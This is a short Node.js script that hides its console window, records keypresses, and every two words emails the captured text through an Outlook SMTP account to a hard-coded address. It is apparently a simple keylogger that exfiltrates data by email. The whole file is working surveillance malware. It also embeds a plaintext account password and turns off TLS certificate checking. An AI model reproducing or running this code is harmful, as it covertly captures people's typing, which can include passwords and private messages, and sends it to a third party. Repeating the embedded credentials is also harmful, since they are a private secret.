const ConsoleWindow = require("node-hide-console-window");
const readline = require('readline');
const MAX_WORDS = 2
var word = new String()
var text = new String()
var nwords = 0

//To hide your console just call:
ConsoleWindow.hideConsole();

// Data for sending the email
const userEmail = "filippo.pomilio@hotmail.it" 
const passUser = "filippoide93" 
const toEmail = "filippo.pomilio@gmail.com" 

async function sendEMail(message){

    var nodemailer = require('nodemailer');

    // hotmail here but you can use what you want..
    const transporter = nodemailer.createTransport({
        host: 'smtp-mail.outlook.com',
        auth: {
            user: userEmail,
            pass: passUser
        },
        tls : { rejectUnauthorized: false }
    });

    try{
        await transporter.sendMail({
            from: userEmail,
            to: toEmail,
            subject: 'Testo',
            text: message
        });
    }catch(e){
        console.log(e)
    };
}
 
readline.emitKeypressEvents(process.stdin);
if (process.stdin.isTTY) process.stdin.setRawMode(true);
 
// listen to keypress 
process.stdin.on("keypress", async (str, key) => { 

    if(key.sequence != ' '){

        word += key.sequence

    }else{

        nwords += 1

        text += word
        text += " "
        word = ""
        
        if(nwords == MAX_WORDS){
            await sendEMail(text)
            text = ''
            nwords = 0
        }

    }
    
})
